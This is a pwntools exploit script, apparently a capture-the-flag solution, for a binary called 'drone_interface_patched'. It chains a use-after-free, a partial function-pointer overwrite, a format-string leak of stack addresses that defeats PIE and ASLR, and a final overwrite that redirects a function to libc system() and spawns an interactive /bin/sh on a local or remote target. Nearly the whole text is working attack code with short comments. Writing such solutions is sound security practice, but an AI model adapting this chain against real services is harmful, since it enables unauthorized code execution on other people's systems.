#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("./drone_interface_patched")
libc = ELF("./libc.so.6")

PROMPT = b">> "

# helpers functions
def conn():
    if args.REMOTE:
        p = remote("172.17.0.3", 1337)
    else:
        p = process(elf.path)
        if args.D:
            gdb.attach(p)
    return p

def send(line, prompt=PROMPT):
    r = p.recvuntil(prompt)
    if isinstance(line, int):
        line = str(line)
    if isinstance(line, str):
        line = line.encode('utf-8')
    p.sendline(line)
    if args.P:
        try:
            print(r.decode('utf-8'))
        except:
            print(r)
    return r

# Exploit

# defeat ASLR by calculating leaked_main_address - base_main_address - code_offset
# defeat PIE by calculating leaked_write_address - libc_base_write_address - code_offset
# with code_offset being the empiric location in the function where the leaked stack address points to (in our case, write+16 and main+260)
def adjust_addresses(leak):
    stack = leak.split(b"0x")
    addr1 = int(stack[3], 16) - 16
    libc.address = addr1 - libc.sym['write']
    text_leak = stack[21].split(b" ")[0]
    addr2 = int(text_leak, 16)
    elf.address = addr2 - elf.sym['main'] - 260

# get the last byte of send_message (kinda overkill way to get 0x3a)
def get_offset():
    s1 = elf.sym['send_message']
    x = chr(s1 & 0xff)
    return x

def exploit():
    send(2) # connect
    send(4) # change SIN
    send(cyclic(65)) # overwrite maximum_overdrive to access send_probe
    send(1) # disconnect, triggers use-after-free
    send(5) # send probe
    send("A"* 16 + get_offset()) # 16b junk, then overwrite LSB of change_sin with that of send_message's address
    send(4) # call send_message
    send("%p " * 30) # leak stack
    # the adjust_addresses function will use the leaked stack to adjust the base address of the program and the libc to account for PIE and ASLR, we now can use their symbols without worrying about binary protections.
    adjust_addresses(send(2)) # connect again to get new memory for another use-after-free
    send(1) # disconnect again
    send(5) # overwrite the drone memory
    # with our adjusted values for system and fire_c_beam
    send(b"A" * 8 + p64(libc.sym['system']) + p64(elf.sym['fire_c_beam']))
    send(4) # call what is now fire_c_beam
    send('/bin/sh') # send it /bin/sh, it will forward it to fire, which is now system
    p.interactive() # profit

p = conn()

if args.I:
    p.interactive()
else:
    exploit()
